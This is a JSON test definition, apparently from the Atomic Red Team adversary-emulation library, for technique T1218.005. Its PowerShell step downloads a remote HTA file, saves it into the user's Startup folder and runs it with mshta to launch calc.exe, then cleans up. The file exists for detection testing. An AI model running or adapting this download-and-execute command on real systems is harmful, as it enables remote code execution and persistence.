{
  "id": "c4b97eeb-5249-4455-a607-59f95485cb45",
  "name": "Mshta Executes Remote HTML Application (HTA)",
  "description": "Execute an arbitrary remote HTA. Upon execution calc.exe will be launched.\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "361a53fd-9137-4b0d-aa67-062f6d21c0e7",
      "type": "execute-command",
      "data": {
        "command": "$var =Invoke-WebRequest \"#{hta_url}\"\n$var.content|out-file \"#{temp_file}\"\nmshta \"#{temp_file}\"\nstart-sleep -s 15\nstop-process -name \"calculator\" -Force\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "dbd66089-0241-4bfd-83e6-b8f78c7f85f6",
      "type": "execute-command",
      "data": {
        "command": "remove-item \"#{temp_file}\" -ErrorAction Ignore\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "361a53fd-9137-4b0d-aa67-062f6d21c0e7",
      "p": "on-success",
      "o": "dbd66089-0241-4bfd-83e6-b8f78c7f85f6"
    },
    {
      "s": "361a53fd-9137-4b0d-aa67-062f6d21c0e7",
      "p": "on-failure",
      "o": "dbd66089-0241-4bfd-83e6-b8f78c7f85f6"
    }
  ],
  "tags": [
    "T1218.005",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "temp_file",
      "type": "string",
      "description": "temp_file location for hta",
      "value": "$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1218.005.hta"
    },
    {
      "name": "hta_url",
      "type": "string",
      "description": "URL to HTA file for execution",
      "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta"
    }
  ]
}